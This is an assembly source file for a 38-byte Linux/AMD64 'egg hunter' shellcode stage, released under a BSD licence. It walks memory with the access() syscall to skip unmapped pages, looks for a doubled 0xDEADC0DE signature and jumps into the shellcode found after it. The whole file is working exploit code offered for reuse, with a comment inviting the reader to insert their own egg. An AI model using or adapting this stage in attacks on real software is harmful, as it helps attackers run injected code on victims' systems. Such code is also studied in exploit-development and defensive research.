;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; 38 byte egg hunter using sys_access() for Linux/AMD64
; odzhan
;
    %define AMD64
    %include "include.inc"
      
    xor     edi, edi  ; rdi = 0
    mul     edi       ; rax = 0, rdx = 0
    xchg    eax, esi  ; rsi = F_OK
    mov     dh, 10h   ; rdx = 4096
nxt_page:
    add     rdi, rdx  ; advance 4096 bytes
nxt_addr:
    push    rdi       ; save page address
    add     rdi, 8    ; try read 8 bytes ahead
    push    SYS_access
    pop     rax 
    syscall
    pop     rdi       ; restore rdi
    cmp     al, -EFAULT
    je      nxt_page  ; keep going until good read
    
    ; put your own egg signature here
    mov     eax, 0xDEADC0DE
    scasd
    jne     nxt_addr

    scasd
    jne     nxt_addr
    
    jmp     rdi       ; jump into shellcode
    
    
